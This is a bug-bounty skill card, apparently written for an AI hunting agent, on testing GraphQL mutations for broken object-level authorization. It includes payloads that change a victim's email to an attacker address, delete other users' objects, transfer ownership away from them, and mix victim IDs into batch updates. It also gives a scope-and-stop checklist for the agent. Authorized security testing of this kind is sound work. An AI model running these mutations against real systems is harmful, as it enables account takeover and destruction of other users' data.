# SKILL: GraphQL Mutation BOLA — test write operations, not only queries

**Skill id:** `tip/graphql-mutation-bola-test-write-operations-not-only-queries`  
**Category:** IDOR, API Hacking  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/41ddac31e88081dabaa9f04fb0a53169  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **IDOR, API Hacking**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

Many GraphQL deployments correctly authorize queries but forget the same checks on mutations (update, delete, transfer, assign). Swap the object ID in mutation arguments while keeping a valid session. Also test unauthenticated mutations and batch mutations that mix your objects with victim objects. High impact: change email, role, ownership, or delete other users' data.

## Payload / Code

```
mutation \{
updateUser(id: "victim-uuid", input: \{email: "[attacker@evil.com](mailto:attacker@evil.com)"\}) \{
id email
\}
\}

Also test:
deleteX(id: "victim")
transferOwnership(from: "victim", to: "you")
batchUpdate(ids: \["you", "victim"\])
```

## Source

Twitter/X AI chat / GraphQL IDOR reports + 2026 hunting notes (mutation ownership frequently weaker than query)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
